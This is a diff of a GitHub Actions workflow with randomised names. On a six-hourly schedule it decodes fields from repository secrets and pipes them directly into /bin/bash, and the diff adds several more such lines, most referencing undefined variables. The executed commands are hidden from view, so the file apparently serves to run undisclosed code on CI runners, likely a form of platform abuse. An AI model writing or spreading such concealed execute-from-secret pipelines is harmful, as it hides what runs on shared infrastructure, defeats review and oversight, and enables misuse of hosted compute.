@@ -1,20 +1,21 @@
 name: wengjingshi1290
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 5/6 * * *'
+    - cron: '48 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wengjingshi1290
         env:
-          rdtt49: ${{ secrets.rdtt49 }}
+          h70402: ${{ secrets.h70402 }}
         run: |
-          echo $rdtt49 | jq -r .lwjyd537 | /bin/bash
-          echo $nq8460 | jq -r .bv42116 | /bin/bash
-          echo $afzyc5 | jq -r .arvj15 | /bin/bash
+          echo $h70402 | jq -r .y8 | /bin/bash
+          echo $bgw0 | jq -r .zouss7451 | /bin/bash
+          echo $rhewn9060 | jq -r .wdtx21 | /bin/bash
+          echo $vecxi6 | jq -r .tb26307 | /bin/bash
+          echo $kqnpt3273 | jq -r .rv44128 | /bin/bash
+          echo $zfgau9177 | jq -r .qwlj15173 | /bin/bash
 
